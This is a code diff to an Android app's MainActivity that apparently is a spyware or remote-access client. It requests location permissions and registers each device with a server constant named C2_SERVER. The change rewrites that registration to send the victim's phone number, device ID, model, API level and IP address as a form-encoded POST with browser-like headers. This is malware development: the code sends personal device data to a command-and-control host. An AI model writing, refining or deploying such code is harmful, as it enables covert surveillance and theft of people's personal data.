@@ -29,19 +29,23 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
-
     private static final int PERMISSION_REQUEST_CODE = 200;
     private static String[] PERMISSIONS = {
         Manifest.permission.ACCESS_COARSE_LOCATION,
@@ -150,15 +154,14 @@ public class MainActivity extends AppCompatActivity {
     private void setClientID() throws JSONException {
         String url = Utils.C2_SERVER + "/client";
 
-        JSONObject json = new JSONObject();
-        json.put("phone", Utils.phoneNumber(getApplicationContext()));
-        json.put("device_api", Utils.deviceAPI());
-        json.put("device_id", Utils.deviceID(getApplicationContext()));
-        json.put("device_model", Utils.deviceModel());
-        json.put("ip_address", Utils.ipAddress());
+        String formData = "phone=" + Utils.phoneNumber(getApplicationContext());
+        formData += "&device_api=" + Utils.deviceAPI();
+        formData += "&device_id=" + Utils.deviceID(getApplicationContext());
+        formData += "&device_model=" + Utils.deviceModel();
+        formData += "&ip_address=" + Utils.ipAddress();
 
         try {
-            ClientID clientID = new ClientID(url, json.toString(), result -> {
+            ClientID clientID = new ClientID(url, formData.toString(), result -> {
                 if (result != null) {
                     int clientId = -1;
                     JSONObject response = new JSONObject(result);
@@ -187,12 +190,12 @@ public class MainActivity extends AppCompatActivity {
     private static class ClientID extends AsyncTask<Void, Void, String> {
 
         private String postURL;
-        private String json;
+        private String formData;
         private PostDataListener listener;
 
-        public ClientID(String postURL, String json, PostDataListener listener) {
+        public ClientID(String postURL, String formData, PostDataListener listener) {
             this.postURL = postURL;
-            this.json = json;
+            this.formData = formData;
             this.listener = listener;
         }
 
@@ -203,45 +206,39 @@ public class MainActivity extends AppCompatActivity {
         @Override
         protected String doInBackground(Void... voids) {
             HttpURLConnection urlConnection = null;
-            BufferedReader reader = null;
-            String jsonResponse = null;
 
             try {
                 URL url = new URL(postURL);
                 urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.setRequestMethod("POST");
-                urlConnection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                urlConnection.setRequestProperty("Accept", "*/*");
+                urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                 urlConnection.setDoOutput(true);
 
-                DataOutputStream dataOutputStream = new DataOutputStream(urlConnection.getOutputStream());
-                dataOutputStream.write(json.getBytes(StandardCharsets.UTF_8));
-                dataOutputStream.flush();
-                dataOutputStream.close();
+                OutputStream outputStream = urlConnection.getOutputStream();
+                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
+                writer.write(formData);
+                writer.flush();
+                writer.close();
+                outputStream.close();
 
-                InputStream inputStream = urlConnection.getInputStream();
-                if (inputStream != null) {
-                    reader = new BufferedReader(new InputStreamReader(inputStream));
-                    StringBuilder responseStringBuilder = new StringBuilder();
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        responseStringBuilder.append(line).append("\n");
-                    }
-                    jsonResponse = responseStringBuilder.toString();
+                // 6. Read the response from the server
+                BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+                StringBuilder response = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    response.append(line);
                 }
+                reader.close();
+
+                // 7. Handle JSON response
+                String jsonResponse = response.toString();
+                return jsonResponse;
             } catch (IOException e) {
-            } finally {
-                if (urlConnection != null) {
-                    urlConnection.disconnect();
-                }
-                if (reader != null) {
-                    try {
-                        reader.close();
-                    } catch (IOException e) {
-                    }
-                }
             }
 
-            return jsonResponse;
+            return null;
         }
 
         @Override
